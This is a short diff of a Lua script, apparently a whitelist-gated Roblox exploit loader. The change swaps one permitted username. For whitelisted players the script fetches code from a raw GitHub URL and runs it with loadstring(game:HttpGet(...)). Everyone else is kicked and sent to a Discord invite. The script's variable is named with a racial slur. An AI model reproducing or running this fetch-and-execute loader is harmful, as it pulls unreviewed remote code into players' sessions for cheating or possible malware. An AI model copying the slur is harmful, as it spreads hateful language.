@@ -5,7 +5,7 @@ if nigga == "antikupper" or
    nigga == "Drachen_party1234a" or
    nigga == "freedllm" or
    nigga == "galaxy_littlebro" or
-   nigga == "blade_verified0" then
+   nigga == "blade_verified" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/rijadha22/bruh/main/nun"))()
 else
 game.Players.LocalPlayer:Kick("Not Whitelisted Get Whitelisted At discord.gg/beamscript")
